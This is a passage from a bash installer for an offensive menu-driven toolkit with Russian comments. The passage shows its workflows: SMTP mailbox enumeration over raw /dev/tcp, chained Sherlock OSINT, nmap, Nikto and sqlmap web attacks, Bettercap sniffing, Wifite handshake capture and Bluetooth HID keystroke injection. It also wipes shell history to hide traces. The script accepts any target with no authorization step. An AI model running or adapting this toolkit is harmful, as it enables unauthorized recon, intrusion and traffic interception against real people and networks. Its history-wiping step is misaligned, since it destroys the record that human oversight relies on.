        echo -e "${CYAN}[i] Формат: EMAIL. Глубокая валидация...${NC}"
        local domain="${target##*@}"
        
        # Проверка типа (v8.0)
        if echo "$domain" | grep -EiQ "temp|yopmail|mailinator|guerrilla"; then
            echo -e "${RED}[!!!] ТИП: ОДНОРАЗОВАЯ ПОЧТА${NC}"
        else
            echo -e "${GREEN}[+] ТИП: ПОСТОЯННАЯ/КОРПОРАТИВНАЯ${NC}"
        fi

        # SMTP Ping
        local mx=$(host -t mx "$domain" 2>/dev/null | awk '{print $NF}' | sed 's/\.$//' | head -n 1)
        [[ -n "$mx" ]] && {
            timeout 5s bash -c "exec 3<>/dev/tcp/$mx/25; read -u 3; echo 'HELO hi' >&3; read -u 3; echo 'MAIL FROM:<test@example.com>' >&3; read -u 3; echo 'RCPT TO:<$target>' >&3; read -u 3; echo 'QUIT' >&3" 2>/dev/null | grep -q "250" && \
            echo -e "${GREEN}[V] СТАТУС: Ящик подтвержден сервером.${NC}" || echo -e "${RED}[-] СТАТУС: Не найден или защищен.${NC}"
        }
    fi

    # СТЕРИЛИЗАЦИЯ
    truncate -s 0 ~/.bash_history
    history -c
    echo -ne "\n${BLUE}>>> Анализ v8.3 завершен. Нажми Enter...${NC}"
    read -r
}



# --- [ SMART FLOW: TOTAL RECON 360 ] ---
# Связка: 27 (Analyzer) + 10 (Sherlock) + 13 (Deep Insight)
flow_total_recon() {
    echo -e "${BLUE}=== [ TOTAL RECON 360 MODE ] ===${NC}"
    echo -ne "${YELLOW}Введите цель (Email/Nick/Domain): ${NC}"
    read -r target
    [[ -z "$target" ]] && return

    # 1. Глубокий анализ доверия и типа (твоя v8.3)
    trust_analyzer_unified "$target"
    
    # 2. Поиск по соцсетям (если это не чистый домен)
    if [[ ! "$target" =~ ^http ]]; then
        echo -e "\n${CYAN}[*] Запуск Sherlock для поиска аккаунтов...${NC}"
        run_sherlock "${target%%@*}"
    fi

    # 3. Сбор метаданных и глубоких инсайтов
    echo -e "\n${CYAN}[*] Сбор Deep Insights...${NC}"
    deep_insight_auto "$target"
    
    LAST_TARGET="$target" # Запоминаем цель для следующего шага
    echo -e "${GREEN}>>> Recon 360 завершен.${NC}"
    read -r
}

# --- [ SMART FLOW: WEB ATTACK STACK ] ---
# Связка: 2 (Nmap) + 7 (Nikto) + 5 (Sqlmap)
flow_web_stack() {
    echo -e "${RED}=== [ WEB ATTACK STACK ] ===${NC}"
    [[ -n "$LAST_TARGET" ]] && echo -e "${YELLOW}Последняя цель: $LAST_TARGET${NC}"
    echo -ne "${YELLOW}Введите URL/IP (или Enter для последней): ${NC}"
    read -r target
    target=${target:-$LAST_TARGET}
    [[ -z "$target" ]] && return

    # 1. Разведка портов
    smart_nmap "$target"
    
    # 2. Поиск уязвимостей сервера
    echo -e "\n${MAGENTA}[*] Передача цели в Nikto...${NC}"
    smart_nikto "$target"
    
    # 3. Проверка на SQL-инъекции (если есть параметры)
    echo -e "\n${MAGENTA}[*] Финальная проверка Sqlmap...${NC}"
    smart_sqlmap "$target"
    
    read -r
}

# --- [ SMART FLOW: NETWORK SNIFFER ] ---
# Связка: 6 (Bettercap) + 20 (Netstat) + 21 (Monitor)
flow_network_sniffer() {
    echo -e "${BLUE}=== [ NETWORK SNIFFER SUITE ] ===${NC}"
    # Запускаем мониторинг соединений в фоне, пока работает сниффер
    run_netstat & 
    local net_pid=$!
    
    run_bettercap_sniffer
    
    kill $net_pid 2>/dev/null
    run_monitor
}

# --- [ SMART FLOW: FULL SYSTEM CARE ] ---
# Связка: 1 (Clean) + 15 (Update) + 16 (Auto-Tasks)
flow_system_care() {
    echo -e "${GREEN}=== [ FULL SYSTEM MAINTENANCE ] ===${NC}"
    clean_system
    update_kali
    setup_autotasks
    echo -e "${GREEN}>>> Система в идеальном состоянии.${NC}"
    sleep 2
}


# --- [ SMART FLOW: WIRELESS DOMINANCE ] ---
# Связка: 11 (Wifite) + 24 (BT-HID) + 12 (USB Guardian)
flow_wifi_attack() {
    echo -e "${RED}=== [ WIRELESS DOMINANCE MODE ] ===${NC}"
    
    echo -e "${CYAN}[1/3] Запуск Wifite (Автоматический захват хендшейков)...${NC}"
    run_wifite
    
    echo -e "\n${MAGENTA}[2/3] Инициализация BT-HID (Эмуляция клавиатуры)...${NC}"
    run_bt_hid_attack
    
    echo -e "\n${BLUE}[3/3] Активация USB Guardian (Защита портов)...${NC}"
    usb_guardian_smart
    
    echo -e "${GREEN}>>> Беспроводные операции завершены.${NC}"
    read -r
}



show_menu() {
    clear
    echo -e "${CYAN}┌───────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│${NC} ${GREEN}    AUTONOMOUS SAMSUNG CORE v8.5.1    ${NC} ${CYAN}│${NC}"
    echo -e "${CYAN}└───────────────────────────────────────────┘${NC}"
    
    run_smart_check

    echo -e "${YELLOW} [ AUTONOMOUS OPERATIONS ]${NC}"
    
    # Сокращаем длину строк до ~35-38 символов суммарно
    echo -e " ${CYAN}A.${NC} TOTAL RECON   ${GRAY}» OSINT & Analytics${NC}"
    echo -e " ${CYAN}B.${NC} WEB ATTACK    ${GRAY}» Scan & Exploit${NC}"
    echo -e " ${CYAN}C.${NC} NET GUARDIAN  ${GRAY}» Sniff & Connect${NC}"
    echo -e " ${CYAN}D.${NC} STERILIZER    ${GRAY}» Ghost & Clean${NC}"
    echo -e " ${CYAN}E.${NC} WIRELESS      ${GRAY}» WiFi & BT-HID${NC}"

    echo -e "\n${GREEN} [ INTERFACE ]${NC}"
    printf "  %-18s %-18s\n" "18. TERMINAL" "0. EXIT"

    echo -e "\n${CYAN}─────────────────────────────────────────────${NC}"
}

# --- Глобальный контекст ---
LAST_TARGET=""

while true; do
    show_menu
    read -p "Выберите операцию: " opt
    case $opt in
        A|a) flow_total_recon ;;      # Внутри: 27 -> 10 -> 13
        B|b) flow_web_stack ;;        # Внутри: 2 -> 7 -> 5 (с проверкой LAST_TARGET)
        C|c) flow_network_sniffer ;;  # Внутри: 6 + 20 + 21
        D|d) flow_system_care ;;      # Внутри: 1 + 15 + 16 + 9
        E|e) flow_wifi_attack ;;      # Внутри: 11 + 24 + 12

        18) run_manual_command ;;     # Оставляем только чистый терминал для спецзадач
        0) exit 0 ;;

        *) 
            echo -e "${RED}[!] Ошибка. Доступны только режимы A, B, C, D, E.${NC}"
            sleep 1 
            ;;
    esac
done

EOF

    chmod +x "$TARGET_FILE"
    echo -e "\033[0;32m[+] v$CURRENT_VERSION Ultra-Precision развернута!${NC}"
}

# Логика обновления
if [ ! -f "$TARGET_FILE" ]; then
    create_files
else
    INSTALLED_VERSION=$(grep "# VERSION=" "$TARGET_FILE" | cut -d'=' -f2)
    if [ "$INSTALLED_VERSION" != "$CURRENT_VERSION" ]; then
        create_files
    else
        echo -e "\033[0;32m[+] Файлы арсенала актуальны ($INSTALLED_VERSION).${NC}"
    fi
fi
